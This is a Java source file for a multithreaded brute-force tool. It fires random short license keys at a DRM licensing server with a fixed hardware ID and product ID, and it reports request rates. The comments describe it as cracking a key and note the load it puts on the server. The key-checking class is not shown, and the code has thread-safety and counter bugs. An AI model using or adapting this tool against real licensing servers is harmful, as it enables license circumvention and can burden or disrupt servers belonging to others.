import java.security.PublicKey;
import java.security.SecureRandom;
import java.util.ArrayList;
import java.util.Collections;

public class Main {
    public static int threds = 100; //How many instances your want to use. The higher the number the higher the load on the server
    public static int keylength = 2; //How long is the key you are trying to crack
    public static String HWID = "8AD4891380AA54EE75B057FDE4A7A0E5EB8EE6A7A0E5EB8D00155DBBA0B6"; //Your knowen hardware id
    public static String PID = "2";// Your knowen product ID
    public static String Serverdomain = "drm.example.com"; // Your server domain
    public static int seconds = 0;
    public static volatile int requests = 0;
    static ArrayList<String> keys = new ArrayList<String>();
    public static void main(String[] args) {
        long startTime = System.currentTimeMillis();
        ArrayList<Double> arr1 = new ArrayList<Double>();
        int i = 0;
        while (!(i == threds)) {
            i++;
            new Thread(new Runnable() {
                @Override
                public void run() {
                    SendRequest();
                }
            }).start();
        }
        new Thread(new Runnable() {
            @Override
            public void run() {
                long startTime = System.currentTimeMillis(); // Define startTime
                while (true) {
                    try {
                        Thread.sleep(1000); // Sleep for one second
                    } catch (InterruptedException e) {
                        e.printStackTrace();
                    }
                    long endTime = System.currentTimeMillis();
                    long totalTime = endTime - startTime;
                    double requestPerSec = (double) requests / (totalTime / 1000.0);
                    arr1.add(requestPerSec);

                    double sum = 0, avg;
                    double avgg =0.0;
                    for(int i = 0; i < arr1.size(); i++) {
                        sum = sum + arr1.get(i);
                        avgg = sum / arr1.size();
                    }
                    System.out.println();
                    System.out.println("Request Sent " + requests);
                    System.out.println("Peek Request per second: " + Collections.max(arr1));
                    System.out.println("Average Request per second: " + avgg);
                    System.out.println("Current Requests per second: " + requestPerSec);
                    //System.out.println(requestPerSec);
                    seconds++;
                }
            }
        }).start();
    }

    public static void SendRequest() {
        while (true) {
            CheckKey keyChecker = new CheckKey();
            String key;
            key = generateRandomString(keylength);
            String LicenceValue = null;
            if (!keys.contains(key)) {
                LicenceValue = keyChecker.checkKey(key);
            }
            keys.add(key);
        }
    }


    public static String generateRandomString(int length) {
        String characters = "0123456789abcdefghijklmnopqrstuvwxyz";
        StringBuilder randomString = new StringBuilder(length);
        SecureRandom random = new SecureRandom();

        for (int i = 0; i < length; i++) {
            int randomIndex = random.nextInt(characters.length());
            randomString.append(characters.charAt(randomIndex));
        }
        return randomString.toString();
    }
}